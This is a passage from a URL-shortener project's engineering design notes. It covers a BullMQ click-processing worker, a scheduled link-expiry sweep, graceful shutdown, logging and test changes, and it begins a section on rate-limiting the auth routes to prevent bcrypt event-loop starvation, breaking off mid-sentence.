**Does Phase 8's capped-TTL decision still hold?** Yes, for what it
actually controls — it still bounds the cache-staleness component
exactly as before, and shrinking it further wouldn't help the queue-lag
component at all (a shorter TTL just means more frequent cache misses
re-reading a Postgres row whose `click_count` is itself now lagging
behind the queue). The decision doesn't need to change; what needed to
change is not overstating what it guarantees now that a second, more
variable lag source exists alongside it — which is exactly the correction
made to `linkService.ts`'s own comment on this TTL as part of this phase.

An active-invalidation enhancement (the worker calling the equivalent of
`invalidateLinkCache(shortCode)` after a successful click on a capped
link, to tighten the cache-lag term specifically) was considered and
deliberately not built this phase — the queue-lag term is the dominant,
harder-to-bound one regardless, so shaving the cache term wouldn't
change the overall worst-case story much, for the cost of a third Redis
client in the worker and an extra payload field.

**Where it lives in the codebase.** `src/services/linkService.ts` (the
`LINK_CACHE_CAPPED_TTL_SECONDS` comment, corrected to describe both lag
sources); `worker/index.ts` (`logQueueDepth`, the operational visibility
into the queue-lag term).

**Common pitfalls.**

- Assuming the 5-second cache TTL is still _the_ bound on overshoot,
  rather than _one of two_ — this was true before this phase and isn't
  anymore.
- "Fixing" this by shortening the cache TTL further — it doesn't touch
  the term that actually dominates once the worker falls behind.

**Production considerations.** If a click cap ever acquires billing or
legal significance — the same condition Phase 8 already named as a
reversal trigger — this phase makes that reversal more urgent, not less:
a hard security/billing boundary can no longer tolerate an unbounded
overshoot term, which is exactly what queue-processing lag introduces
whenever the worker falls behind. At that point, enforcement would need
to move off this lazy-read-plus-cache pattern entirely — e.g. a
synchronous, atomic Redis counter or Lua script checked before the
redirect fires, not a background job.

**Interview answer.** Before this phase, a capped link's click_count
overshoot was bounded by a single number — the 5-second cache TTL, since
the write was synchronous. Moving the write onto a queue added a second,
independently-varying lag source on top of that: queue-processing time,
which is normally sub-second but genuinely unbounded if the worker falls
behind or goes down. So the honest bound now is "clicks within the cache
window, plus whatever's sitting unprocessed in the queue" — and that
second term isn't a number I can quote without operational visibility
into queue depth, which is exactly why I treated queue depth as a
required piece of observability for this phase, not an optional add-on.
The 5-second TTL decision itself didn't need to change; what needed to
change was being honest in the docs about what it actually bounds now.

---

### Scheduled cleanup: lazy and scheduled expiry running together

**What it is.** A repeatable BullMQ job (`worker/processors/
linkCleanupProcessor.ts`, `sweepExpiredLinks`) that flips `is_active =
false` for links whose `expires_at` has passed — the scheduled half of
expiry that Phase 7 deliberately left out, implementing lazy expiry only.

**Why it exists in this project.** Phase 7's "Lazy vs. scheduled expiry"
already laid out why production systems that expire things at scale
(session stores, cache entries, this table) tend to run both mechanisms
together: lazy expiry (Phase 7's `deadStateError`, still unchanged) gives
immediate, per-request correctness with zero extra infrastructure but
leaves expired rows accumulating in the table forever, since nothing
proactively cleans them up; scheduled expiry reclaims that storage and
stops every future read from repeatedly re-evaluating a row that's
provably, permanently dead — but alone, it would leave a correctness gap
between sweep runs that lazy expiry is what actually closes. Running only
one leaves a gap the other exists specifically to close.

**How it works mechanically.**

```sql
UPDATE links
SET is_active = false, updated_at = now()
WHERE is_active = true
  AND expires_at IS NOT NULL
  AND expires_at <= now();
```

A single `UPDATE`, no transaction needed — one statement is already
atomic under Postgres's MVCC, the same reasoning already established for
`click_count`'s increment. Registered as a repeatable job via BullMQ's
`upsertJobScheduler` (`worker/scheduler.ts`), firing every 60 seconds — a
starting point chosen for local-dev observability (easy to see it run
without a long wait) and because a single unindexed `UPDATE` scan over
`is_active`/`expires_at` is a complete non-issue at this project's scale,
not a tuned production interval (deployment/scheduling configuration is
explicitly out of scope for this phase).

**Scoped to `expires_at` only — never `max_clicks`.** `deadStateError`
checks three conditions in priority order — `is_active`, `expires_at`,
then `click_count >= maxClicks` — each returning a different message for
the same 410 status. If the sweep also flipped `is_active` for a link
that's dead _only_ because it's click-exhausted, the next request would
hit the `is_active` branch first and return "This link has been
deactivated" instead of "This link has reached its click limit" — a real
message change the sweep has no business causing. So the sweep touches
`expires_at` only.

**One deliberate, unavoidable message-text change.** Even scoped this
way, there's a narrow but real behavior change worth naming rather than
glossing over: before the sweep has ever run against a given expired-but-
still-`is_active=true` link, `deadStateError` falls through to the
`expires_at` branch and returns "This link has expired." After the sweep
processes that row, a later request hits the now-flipped `is_active`
check first and returns "This link has been deactivated" instead. This
is an expected consequence of introducing scheduled expiry, not a
regression — arguably it's _more_ correct after the sweep, since the row
genuinely is deactivated now, mechanically — but it's an observable
message-text change a client would see, so it's captured as an explicit
test assertion (`tests/routes/redirect.test.ts`, "an expired link reads
... before the sweep ... after") rather than left as an implicit
surprise.

**No new index (as of this phase).** The sweep's `WHERE` clause touches
`is_active`/`expires_at`, both explicitly _not_ indexed per the `links`
migration's own comment — deferred to "Phase 11" (originally written here
as "Phase 12"; corrected once the indexing pass actually landed under its
real phase number), a dedicated, measurement-driven indexing pass. This
phase doesn't add one either, for the same reason: this is a low-frequency,
schedule-driven scan, not a per-request hot path, and adding an index now
without measurement would repeat the exact mistake Phase 7/8's whole
methodology has consistently avoided elsewhere. Phase 11 now has two
consumers who'd benefit from that index (this sweep, and the click-
aggregation analytics endpoint it turned out to gain) — which strengthened
the case for a proper measurement pass later, not for guessing now. **Update
from Phase 11:** that measurement pass happened — `links_expires_at_active_
partial_index`, a partial index on `expires_at` scoped to `WHERE is_active =
true`, now serves this exact query. See "Phase 11: Database Optimization"
below for the before/after `EXPLAIN ANALYZE` proof (`Seq Scan` over all
50,000 seeded links → `Bitmap Index Scan` over the ~1,441 matching rows).

**Where it lives in the codebase.** `worker/processors/
linkCleanupProcessor.ts` (`sweepExpiredLinks`); `worker/scheduler.ts`
(`registerLinkCleanupScheduler`); `tests/worker/
linkCleanupProcessor.test.ts`; `tests/routes/redirect.test.ts` (the
message-transition test).

**Common pitfalls.**

- Scoping the sweep to _every_ dead-state condition "for consistency,"
  rather than only the one (`expires_at`) that scheduled expiry is
  actually meant to address — `max_clicks` exhaustion isn't a storage-
  reclamation problem the way time-based expiry is; there's no equivalent
  "sits in the table forever, invisibly" failure mode for it, since a
  click-exhausted link's `click_count` is already being actively written
  to.
- Not calling out the message-text transition explicitly, and having it
  discovered later as an apparent regression instead of a documented,
  intentional consequence.

**Production considerations.** As sweep frequency or table size grows,
this is exactly the kind of scan Phase 11's indexing pass should
prioritize first — but only once there's real data on sweep duration and
frequency to measure against, not before. (It did — this was, in fact, the
single largest before/after improvement in Phase 11's measurements: see
below.)

**Interview answer.** Phase 7 only implemented lazy expiry — checking
`expires_at` at read time, never writing anything back — specifically so
this phase could add the scheduled half without redoing that decision.
The sweep is a single, naturally idempotent `UPDATE` that flips
`is_active` for expired links, run on a BullMQ repeatable schedule. I
scoped it to `expires_at` only, deliberately excluding `max_clicks`
exhaustion, because flipping `is_active` for a click-exhausted link would
change which dead-state message a client sees for a case scheduled
expiry was never meant to touch. That said, even scoped this way there's
one real, if narrow, behavior change I called out explicitly rather than
letting it surprise someone later: once the sweep has processed an
expired link, its 410 message changes from "this link has expired" to
"this link has been deactivated" — expected and arguably more accurate,
but observable, so it's asserted in a test rather than left implicit.

---

### Safe under multiple worker instances

**What it is.** Two independent mechanisms making the cleanup sweep safe
to run from every worker instance simultaneously, if this project ever
runs more than one.

**Why it exists in this project.** The task explicitly requires this:
the sweep "will run on every worker instance if you ever run more than
one" — worth designing for now, even with a single instance in practice
today, since retrofitting safety later (after horizontal scaling is
already relied on) is a worse time to discover a gap.

**How it works mechanically.**

1. **`upsertJobScheduler`'s own idempotent registration.** BullMQ v5+'s
   `Queue.upsertJobScheduler(schedulerId, ...)` is explicitly designed to
   _upsert_ the schedule definition keyed on `schedulerId`, not create a
   new one each call. `worker/scheduler.ts` calls this unconditionally
   from every worker instance at boot — if N replicas all start up and
   all register with the same `schedulerId` and pattern, the result is
   exactly one active schedule; calls 2 through N are no-ops by BullMQ's
   own design. Chosen over the older `.add()`-with-a-`repeat`-option
   pattern specifically for this upsert semantics — that older pattern
   has known footguns around removing/re-registering repeatable
   definitions across versions.
2. **The sweep SQL's own idempotence, independent of (1).** Even in a
   hypothetical world where the scheduler-level dedup somehow has an edge
   case (or someone runs an ad hoc extra cleanup by accident), `UPDATE ...
WHERE is_active = true AND expires_at <= now()` converges to the same
   end state no matter how many times or how concurrently it runs — a row
   that's already `is_active = false` simply doesn't match the `WHERE`
   clause on a later run, and Postgres's row-level locking serializes any
   genuinely concurrent execution against the same rows.

Both are used deliberately, not as redundant belt-and-suspenders for its
own sake: (1) is what avoids _wasted, redundant scheduling_ (multiple
timers firing the same sweep more often than intended); (2) is what
actually guarantees the _outcome_ is correct even if (1) somehow failed —
they protect against different failure classes, at very low incremental
cost to build both.

**Where it lives in the codebase.** `worker/scheduler.ts`
(`registerLinkCleanupScheduler`); `worker/processors/
linkCleanupProcessor.ts` (the naturally idempotent `UPDATE`); `tests/
worker/linkCleanupProcessor.test.ts` ("calling it twice results in
exactly one active scheduler, not two"; "deactivates ... twice in a row
without error or double effect").

**Common pitfalls.**

- Relying on only the scheduler-level dedup and assuming the underlying
  operation is therefore safe under concurrency — dedup at the scheduling
  layer says nothing about whether the _work itself_ is safe if it
  somehow ran twice; that has to be true independently.
- Writing a sweep operation that _isn't_ naturally idempotent (e.g. one
  that appends an audit-log row per link deactivated, rather than a
  pure state-flip) without separately guarding against duplicate
  execution — the `UPDATE`'s idempotence here is a property of what it
  _does_ (flip a flag to a fixed value), not something guaranteed for
  every possible sweep operation.

**Production considerations.** This is exactly what makes horizontal
scaling of the worker safe to turn on later without revisiting this
code at all — multiple replicas registering the same schedule and
occasionally racing on the same sweep execution is already a handled
case, not a future problem.

**Interview answer.** I made the cleanup scheduler safe under multiple
worker instances two ways, deliberately, not just one. First,
`upsertJobScheduler` is designed to be called repeatedly with the same
ID — every worker registers it at boot, and N replicas converge to
exactly one active schedule. Second, and just as important, the sweep's
own SQL is independently idempotent — an `UPDATE` gated on `is_active =
true` simply matches nothing on a row that's already been flipped, so
even concurrent executions converge to the same correct end state. The
first mechanism avoids wasted, redundant scheduling; the second is what
actually guarantees correctness even if the first one somehow had a gap
— they cover different failure modes, so I built both rather than
picking one.

---

### Worker graceful shutdown

**What it is.** `worker/shutdown.ts`'s `gracefulShutdown` — closes every
`Worker` (waiting for its currently in-flight job, if any, to finish),
then closes the read-only `Queue` handles, the worker's own Postgres
pool, and its Redis connection, in that order.

**Why it exists in this project.** The same signal-handling need
`src/server.ts` already has (a container orchestrator sends `SIGTERM`,
then `SIGKILL` after a grace period; Node's default `SIGTERM` behavior is
to terminate immediately, abandoning whatever was in flight) — but the
unit of in-flight work is different. The API drains in-flight _HTTP
requests_; the worker has no requests at all, only in-flight _jobs_.

**How it works mechanically.** `Worker.close()` (called with no `force`
argument — i.e. `force: false`) waits for any currently-active job to
finish before resolving, rather than abandoning it mid-processing. Only
after every `Worker` has closed does `gracefulShutdown` close the `Queue`
handles, the Postgres pool, and the Redis connection — the same ordering
principle `server.ts` already established: nothing an in-flight unit of
work depends on closes until that work has actually finished, not before
or concurrently with it. `worker/index.ts` wires this to both `SIGTERM`
and `SIGINT`, with the same kind of unref'd force-exit timeout `server.
ts` uses as a safety net if a job never finishes draining.
`gracefulShutdown` is exported as a standalone function specifically so
the shutdown _logic_ is unit-testable by calling it directly, without
needing a real process/signal for every test — real signal handling still
needs an actual child process to test end-to-end (see "What changed in
the test suite" below), but that cost is paid once, for the one test that
genuinely needs it.

**Where it lives in the codebase.** `worker/shutdown.ts`
(`gracefulShutdown`); `worker/index.ts` (`SIGTERM`/`SIGINT` wiring, the
force-exit timeout).

**Common pitfalls.**

- Copying `src/server.ts`'s shutdown function directly into the worker —
  it calls `server.close()`, which has no meaning in a process with no
  HTTP server; the _ordering principle_ transfers, the specific code
  doesn't.
- Closing the Postgres pool or Redis connection before every `Worker` has
  actually closed — an in-flight job could still be mid-transaction; the
  ordering matters for exactly the same reason it matters in `server.ts`.
- Testing graceful shutdown by calling the shutdown function directly
  and never exercising a real `SIGTERM` at all — that proves the shutdown
  _logic_ works, not that the process's actual signal handler is wired up
  correctly, which is a distinct thing to get wrong (e.g. registering the
  handler after the point where a signal could already have arrived).

**Production considerations.** The 10-second force-exit timeout is a
starting point mirroring `server.ts`'s own — worth revisiting only if a
real job's worst-case duration approaches it, which nothing at this
project's current scale does.

**Interview answer.** The worker's graceful shutdown follows the same
principle `server.ts` already established — don't close anything an
in-flight unit of work depends on until that work has actually finished —
but the unit is different: jobs, not HTTP requests. `Worker.close()`
without forcing waits for any currently-active job to finish before
resolving; only after every worker has closed does the shutdown code
close the Postgres pool and Redis connection. I exported the shutdown
logic as a standalone function so most of it is unit-testable without a
real process, but I still wrote one test that spawns the actual worker
as a child process and sends it a real `SIGTERM`, because signal wiring
itself — is the handler actually registered, does it actually receive the
signal — can't be verified any other way.

---

### Observability: structured logging, job lifecycle, queue depth

**What it is.** Worker logs matching the API's exact structured format;
explicit logging of a job's lifecycle (started, completed with duration,
failed with attempt number); periodic logging of queue depth.

**Why it exists in this project.** Once click recording moved off the
request path, there's no HTTP response to signal anything went wrong —
a click that silently fails to process, or a worker that silently falls
behind, has no other signal surfacing it. This is also what turns
"click_count's overshoot is bounded" (see that section above) from a
hopeful claim into something actually monitored.

**How it works mechanically.** `worker/logger.ts` mirrors `src/lib/
logger.ts`'s construction exactly — same conditional pino-pretty-in-
development pattern, forced by the same `exactOptionalPropertyTypes`
constraint — so worker logs are visually and structurally identical to
API logs, just from a different process. `worker/index.ts` attaches
generic `'active'`/`'completed'`/`'failed'` listeners to every `Worker`
instance (not per-processor logic, so both the click and cleanup workers
get identical lifecycle logging for free): `'active'` logs `jobId`/
`attemptsMade` ("Job started"); `'completed'` logs `jobId`/`durationMs`
(computed from `job.finishedOn - job.processedOn`); `'failed'` logs
`jobId`/`attemptsMade`/`maxAttempts`/`willRetry`, so a log reader can
distinguish "will retry" from "exhausted every attempt" at a glance.
Queue depth (`clickQueue.getWaitingCount()`/`getActiveCount()`/
`getDelayedCount()`/`getFailedCount()`) is logged every 30 seconds as a
single structured line.

**What a growing queue depth indicates.** A growing `waiting`/`delayed`
count means the worker is falling behind — concurrency too low for
current volume, Postgres degraded, or the worker process down entirely.
This is the operational signal that makes click_count's two-lag-source
overshoot bound (see that section above) something an operator can
actually act on, rather than a theoretical worst case with no way to
know when it's actually happening.

**Where it lives in the codebase.** `worker/logger.ts`; `worker/index.ts`
(`'active'`/`'completed'`/`'failed'` listeners, `logQueueDepth`).

**Common pitfalls.**

- Logging job lifecycle events inside each processor function
  individually, duplicated per job type — centralizing it at the `Worker`
  level (generic listeners, not processor-specific code) means every
  current and future job type gets identical, consistent lifecycle
  logging for free, and a processor only logs what's genuinely specific
  to its own business logic (e.g. `clickProcessor`'s "duplicate job,
  skipping increment" warning).
- Adding a metrics library (`prom-client` or similar) for queue depth
  without first asking whether structured logs already answer the
  question — consistent with this codebase's existing rule against
  silently adding dependencies (Phase 8 made the same call for cache hit
  rate), queue depth is logged, not exported as a metric, this phase.

**Production considerations.** A real deployment would want queue depth
alerted on past some threshold (not just logged), and would likely want
it as an actual metric (a counter/gauge scraped by Prometheus or
equivalent) rather than parsed out of logs at volume — neither was added
this phase, consistent with "no deployment configuration" being out of
scope, but the structured log lines already carry everything a metrics
pipeline would need to be pointed at later.

**Interview answer.** Worker logs match the API's structured format
exactly, and I centralized job-lifecycle logging (started, completed
with duration, failed with attempt number) at the `Worker` level via
generic event listeners, rather than duplicating logging code inside
each processor — every job type gets consistent lifecycle logging for
free, and a processor only logs what's actually specific to its own
logic. I log queue depth every 30 seconds, because a growing waiting or
delayed count is the concrete signal that the worker is falling behind —
concurrency too low, Postgres degraded, or the worker down entirely —
which is exactly the operational visibility that makes this phase's
click_count overshoot analysis something actionable rather than a
theoretical worst case nobody would notice happening in practice.

---

### One repo, multiple deployables

**What it is.** A single repository now produces two independently
runnable, independently deployable processes — the API (`src/server.ts`)
and the worker (`worker/index.ts`) — with their own entry points, build
outputs, and npm scripts, sharing dependencies and one small contracts
file, nothing else load-bearing.

**Why it exists in this project.** This is the natural consequence of
"separate process, not a thread" (see "Producer/consumer separation"
above) actually being followed through into how the project is built and
run, not just how it's architected in theory.

**How it works mechanically.** `worker/tsconfig.json` extends the root
`tsconfig.json` but sets its own `rootDir`/`outDir`/`include`, so `tsc -p
worker/tsconfig.json` compiles `worker/index.ts` (and the one file it
imports from `src/`, `src/queues/contracts.ts`) into `dist/worker/index.
js`, independent of the API's own `npm run build` output at `dist/
server.js` — the root `tsconfig.json`'s `exclude: [...,"worker",...]`
stays untouched, so the API's build is completely unaffected by the
worker existing at all. New scripts mirror the API's own naming/shape
exactly: `worker:dev` (`tsx watch`, hot reload), `worker:build` (`tsc -p
worker/tsconfig.json`), `worker:start`/`worker:start:local` (run the
compiled output, with or without loading `.env`).

**Local development.** `docker compose up -d` (unchanged — the Redis
service's own comment already anticipated "the BullMQ job queue broker
for the future worker process," and its named volume already anticipated
persisting queued jobs across a restart) and `npm run migrate:up`, then
two terminals: `npm run dev` for the API, `npm run worker:dev` for the
worker, both against the same local Postgres/Redis. No combined "run
both at once" script was added — a `concurrently`-style dependency for a
two-command convenience isn't worth the added `package.json` surface at
this project's stage, and running them separately is what the task
itself asked to be documented anyway (useful for watching one process's
logs in isolation while debugging).

**Where it lives in the codebase.** `worker/tsconfig.json`; `package.
json` (`worker:*` scripts); `docker-compose.yml` (unchanged, already
correct).

**Common pitfalls.**

- Letting the worker's build accidentally depend on the API's `dist/`
  output, or vice versa — each `tsconfig.json` compiles independently
  from source, so neither build has to run, or even exist, for the other
  to succeed.
- Assuming "two processes" requires "two repositories" — a monorepo-style
  single repository with clearly separated build/run configuration per
  deployable is a completely standard pattern, not a compromise; splitting
  into separate repos would trade a shared-contracts-file's simplicity for
  cross-repo versioning overhead, for no benefit at this project's size.

**Production considerations.** No deployment configuration was added
this phase (explicitly out of scope) — but this is exactly the seam a
deployment phase would attach to later: two build outputs, two run
commands, ready to become two separate deployed services (e.g. two
processes in a `docker-compose.yml`, or two services in a container
platform) without any further code changes.

**Interview answer.** This phase turned one deployable into two, sharing
a single repository and almost nothing else load-bearing — one small,
dependency-free file defines the queue contract both sides agree on, and
that's it. Each side has its own `tsconfig.json`, compiles independently
into its own `dist/` output, and has its own npm scripts mirroring the
API's existing naming. I didn't add a combined dev-runner script, since
running them in separate terminals is both simpler to set up and more
useful for debugging one process's logs in isolation — and I didn't add
any deployment configuration, since turning "two build outputs, two run
commands" into "two deployed services" is a distinct, later concern this
phase deliberately left the seam open for, without doing it prematurely.

---

### What changed in the existing test suite, and why

**What it is.** `tests/routes/redirect.test.ts`'s click-recording
assertions, previously synchronous (checking `clicks`/`click_count`
immediately after the HTTP response), restructured around the fact that
recording now happens in a separate process nothing in the test run is
consuming jobs on behalf of.

**Why it exists in this project.** A test asserting `click_count`
immediately after `await request(app).get(...)` was implicitly relying on
`recordClick` having already run synchronously inside that same request —
true before this phase, false after. Making these tests still pass
without becoming slow or flaky meant changing _what_ they assert and, in
some cases, _how_ click processing gets triggered inside the test itself,
not just updating expected values.

**How it works mechanically.**

- **Enqueue-payload correctness** (was: assert a `clicks` row exists with
  the right `referrer`/`user_agent`) now asserts against the real
  `clickQueue` instead — `vi.spyOn(clickQueue, 'add')` captures the exact
  call, and the test checks `data.linkId`/`data.shortCode`/`data.referrer`/
  `data.userAgent`/the `jobId`-equals-`clickId` relationship, without
  needing a worker to actually process anything.
- **The old 20-concurrent-redirects test** (was: proving no lost
  `click_count` increments under concurrency) split into two, at the two
  different layers where two different guarantees now live: a
  **producer-side** test in `redirect.test.ts` (20 concurrent redirects
  enqueue 20 jobs with 20 _distinct_ `clickId`s — added specifically
  because idempotency's entire design keys on that uniqueness holding;
  see "Idempotency" above for why this needed its own test, separate from
  processing-correctness), and a **worker-side** test in `tests/worker/
clickProcessor.test.ts` (20 concurrently-processed jobs, with already-
  distinct `clickId`s, never lose an increment — the direct descendant of
  the original test, just now exercised at the layer where the write
  actually happens).
- **maxClicks enforcement and the capped-overshoot test** both needed
  click processing to actually happen partway through, without waiting on
  a real worker — a `getAndProcessClick` test helper hits the route,
  captures the job BullMQ would have received (via the same `add` spy),
  and immediately calls `processClickJob` directly against it, standing in
  for the worker. The 5-second cache-TTL wait these tests already had
  (Phase 8) is unchanged; what changed is that click _processing_ is now
  driven explicitly rather than assumed to have already happened
  synchronously.
- **A new test for the sweep's message-text transition** (see "Scheduled
  cleanup" above) — asserts the 410 message changes from "expired" to
  "deactivated" once the sweep has actually run, explicitly isolated from
  Phase 8's cache-staleness window (the cache is cleared directly between
  the two assertions) so this test is about the sweep specifically, not
  compounded with caching behavior already covered elsewhere.
- **A new `afterAll` in `redirect.test.ts`** obliterates `clickQueue`
  after the file's tests run — every `GET /:shortCode` in the file
  enqueues a real job, and nothing in the test run consumes them, so
  without this they'd simply accumulate in the shared dev Redis across
  every test run indefinitely.

Two smaller, unrelated fixes surfaced along the way: `tests/db/
migrations.test.ts`'s rollback test had `count: 3` hardcoded for exactly
three pre-existing migrations — adding this phase's fourth migration
(`job_id`/`clicks_job_id_unique`) meant a `down` of only 3 no longer fully
rolled back, leaving `users` still applied and every subsequent test file
seeing a half-torn-down schema; fixed to `count: 4`. And the graceful-
shutdown integration test, which spawns the worker as a real child
process, needed `LOG_LEVEL` overridden to `'info'` specifically for that
child — `.env.test` sets `'warn'` project-wide (to keep the rest of the
suite's output quiet), which was silently suppressing every log line the
test needed to read back from the child's `stdout`, including "ready."

**Where it lives in the codebase.** `tests/routes/redirect.test.ts`;
`tests/worker/clickProcessor.test.ts`; `tests/worker/
linkCleanupProcessor.test.ts`; `tests/worker/clickQueue.integration.
test.ts`; `tests/db/migrations.test.ts` (the `count: 4` fix).

**Common pitfalls.**

- Updating a synchronous test's expected values without questioning
  whether the test's _timing assumption_ still holds at all — a test that
  happened to pass by accident (because processing was fast enough to
  finish before the assertion ran) is a flaky test waiting to surface
  later under different timing, not a correct one.
- Hardcoding a migration count in a test instead of deriving it (e.g.
  counting migration files) — a small, easy-to-forget coupling that only
  breaks the day someone adds a new migration, which is exactly what
  happened here.
- Spawning a real child process to test something that unit-testing the
  underlying function would cover just as well — reserved for the one
  case (real `SIGTERM` handling) that genuinely can't be verified any
  other way; everything else in this phase's test suite runs against
  real Postgres/Redis in-process, matching this project's existing
  testing philosophy.

**Production considerations.** None specific to this section — this is
entirely about test-suite correctness, not runtime behavior.

**Interview answer.** Moving click recording off the request path broke
an implicit assumption several existing tests depended on — that
`click_count` was already updated by the time the HTTP response came
back. Rather than just updating expected values, I changed what each
test actually verifies: payload-correctness tests now assert against the
real BullMQ queue instead of Postgres; the old concurrency test split
into a producer-side test (do concurrent requests generate distinct
idempotency keys — a real, separate failure mode this phase introduced)
and a worker-side test (does concurrent processing avoid lost
increments, the original guarantee, now proven where the write actually
happens); and tests needing an actual recorded click drive processing
directly through a test helper rather than assuming it already happened.
I also found and fixed an unrelated latent bug this phase's own migration
exposed — a test hardcoding "3 migrations" that broke the moment a fourth
one existed — which is exactly the kind of thing a full test-suite run
after a schema change is supposed to catch.

## Phase 10: Rate Limiting

### Why rate limit auth at all: bcrypt and the event loop

**What it is.** `POST /api/auth/signup` and `POST /api/auth/login` are now
rate limited (`signupLimiter`/`loginLimiter` in
`src/middleware/rateLimit.ts`) — strict limits, keyed per IP, before this
phase had zero throttling on either.

**Why it exists in this project.** It would be easy to justify this as
generic "security best practice" and stop there, but the specific
mechanism matters. `passwordService.ts` uses `bcryptjs`, a pure-JavaScript
implementation of bcrypt — not a native binding that can run its hashing
loop on a separate thread. Every `hashPassword`/`verifyPassword` call (and
`login`'s dummy-hash comparison on the "no such user" path — see Phase 4,
"Timing attacks on login") runs bcrypt's cost-factor loop synchronously on
Node's single event-loop thread. That loop is deliberately slow — that's
the whole point of a work factor — which means it's also deliberately
_blocking_.

A burst of concurrent login attempts doesn't just risk a successful guess;
each one occupies the event loop for the full cost-factor duration
(`BCRYPT_COST=12` in production, tuned for ~200-300ms/hash). Enough
concurrent attempts and the event loop is saturated doing bcrypt work,
unable to service _any_ other request on this process — including
`GET /:shortCode`, the redirect path Phases 8 and 9 spent real effort
optimizing. An attacker doesn't need to guess a single password correctly
to hurt this app; they only need to send enough concurrent login/signup
requests to starve the event loop. That's a denial-of-service angle
bcrypt's cost factor makes _worse_, not better, without something bounding
how many of these expensive requests can arrive at once — which is what a
rate limiter, not bcrypt's own cost tuning, has to provide.

**How it works mechanically.** See "Fixed window, sliding log, sliding
counter, token bucket" below for the counting algorithm itself. The
limiter middleware runs _before_ `validateBody` on both routes (see
`src/routes/auth.ts`), specifically so a request over budget is rejected
before it reaches the schema parse — and therefore well before it could
ever reach `hashPassword`/`verifyPassword`. Rejecting late (after the
expensive work already ran) would defeat the entire point.

**Where it lives in the codebase.** `src/middleware/rateLimit.ts`
(`signupLimiter`, `loginLimiter`); wired in `src/routes/auth.ts`. Proven in
`tests/routes/auth.test.ts`'s `describe('rate limiting')` block.

**Common pitfalls.**

- Treating "rate limit auth because security" as sufficient justification
  without naming the actual mechanism — the _specific_ reason this app
  needs it is that bcryptjs's cost factor is CPU-bound, synchronous, and
  shared with every other request this process handles, not just "brute
  force is bad in general."
- Rate limiting only login and not signup — signup calls `hashPassword`
  too (see `authService.signup`), so it's exactly as capable of
  saturating the event loop as login is.

**Production considerations.** A cost factor increase (say, moving
`BCRYPT_COST` from 12 to 14 for a stronger security posture) makes this
DoS angle _worse_, not just slower per-guess — each concurrent request now
blocks the event loop for longer. Rate limiting and cost-factor tuning
have to be considered together, not independently.

**Interview answer.** bcrypt's cost factor slows down each individual
guess, but it doesn't bound how many guesses can be in flight at once —
and because `bcryptjs` is pure JS running synchronously on the event loop,
a burst of concurrent login or signup attempts doesn't just risk a
successful brute-force, it can stall every other request this process is
handling, including unrelated endpoints like the redirect path. That's
the strongest argument for rate limiting these two routes specifically: a
rate limiter bounds concurrent expensive work, which is a problem bcrypt's
own cost tuning can't solve and actually makes worse the stronger it's
configured.

---

### Fixed window, sliding log, sliding counter, token bucket — and which one we're using

**What it is.** Four ways to implement "no more than N requests per client
per time period," each with a different accuracy/cost tradeoff:

- **Fixed window** — a counter per key, reset every `windowMs`. Cheap (one
  counter, one TTL), but a client can send `max` requests at the very end
  of one window and `max` more at the very start of the next, getting up
  to `2×max` through in a span much shorter than one window — "boundary
  bursting."
- **Sliding window log** — store a timestamp per request, count how many
  fall within the trailing window on each check. Exact, no boundary
  bursting, but storage grows with request volume (one entry per request,
  not per key) and every check has to scan/prune that log.
- **Sliding window counter** — approximate the sliding log by weighting
  the previous fixed window's count by how much of it still overlaps the
  trailing window, plus the current window's count. Close to exact
  accuracy at fixed-window's storage cost (two counters, not a growing
  log), which is why it's a common middle ground.
- **Token bucket** — a bucket holds up to some number of tokens, refilled
  at a steady rate; each request consumes one token, and a request with no
  tokens available is rejected (or queued). Naturally allows a burst up to
  the bucket's capacity while still bounding the long-run average rate —
  the closest of the four to modeling "occasional bursts are fine, sustained
  abuse isn't."

**Why it exists in this project.** `express-rate-limit`'s default store
(and `rate-limit-redis`, its Redis-backed counterpart — see Step 2 below)
both implement **fixed window** counting: a hit count per key, reset when
`windowMs` elapses since that key's first hit in the current window. That
was a deliberate choice to accept, not work around — see below.

**How it works mechanically.** Each `buildLimiter(...)` call in
`src/middleware/rateLimit.ts` sets `windowMs` and `limit`; the store
increments a counter for whatever `keyGenerator` returns and compares it
against `limit` on every request, resetting the counter once `windowMs`
has elapsed since the window began for that key.

Boundary bursting is a real weakness of this algorithm, and it's not
mitigated here — but it doesn't matter for what these four limiters are
actually defending. The auth limiters exist to bound a _sustained_ event-
loop-starving burst (see the section above); a client managing to briefly
double their rate across one window boundary doesn't come close to
starving the event loop the way an unthrottled sustained attack would. The
unlock limiter exists to bound _sustained_ password-guessing throughput
against one link; a brief doubling at a window edge barely changes the
expected number of guesses needed to find a real password. None of this
app's actual threat models care about a short-lived 2x at a boundary the
way, say, a strict per-second API quota for billing purposes would.

**Where it lives in the codebase.** `express-rate-limit`'s and
`rate-limit-redis`'s internal store implementations — not something this
project implements itself (see the dependency-justification note in the
"Dependencies" discussion below: rate limiting's edge cases are better
left to an audited library than reimplemented for the sake of using a
different algorithm).

**Common pitfalls.**

- Assuming "fixed window" means imprecise or unsafe in general — its
  weakness is boundary bursting specifically, and whether that matters is
  a judgment call about the actual threat model, not a universal defect.
- Reaching for a more complex algorithm (sliding log, token bucket)
  without first asking whether boundary bursting is actually a problem for
  the thing being protected — added complexity needs a concrete failure
  mode to justify it, the same reasoning Phase 8's "Cache stampede"
  section already applied to a different piece of infrastructure.

**Production considerations.** If this app ever added a strict, revenue-
or SLA-relevant per-second quota (e.g. metering paid API usage), boundary
bursting could matter enough to justify a sliding window counter or token
bucket instead — that's a different problem than the abuse this phase's
four limiters defend against.

**Interview answer.** There are four common approaches — fixed window,
sliding window log, sliding window counter, and token bucket — trading
off accuracy against storage/compute cost. I used express-rate-limit's
default, which is fixed-window counting: cheap, but it allows a brief
doubling of throughput across a window boundary. I judged that
acceptable here because every limiter in this phase defends against a
_sustained_ abuse pattern — an event-loop-starving login burst, sustained
password brute-forcing against one link — where a momentary boundary
burst doesn't meaningfully change the outcome. I'd reach for a sliding
window counter or token bucket if this app ever needed a strict,
consequential per-second quota, where that boundary effect would actually
matter.

---

### In-memory state and the silent N-instance multiplication problem

**What it is.** Step 1 of this phase used `express-rate-limit`'s default
store: an in-memory `Map` living inside the API process, counting hits
per key. Correct as long as exactly one process handles all traffic;
silently wrong the moment there's more than one.

**Why it exists in this project — as a deliberate, temporary step.** The
in-memory store was implemented and run first, on purpose, specifically
to observe this failure mode directly rather than only read about it
before immediately fixing it in Step 2 with a shared Redis-backed store.

**How it works mechanically.** Running two instances of this API on
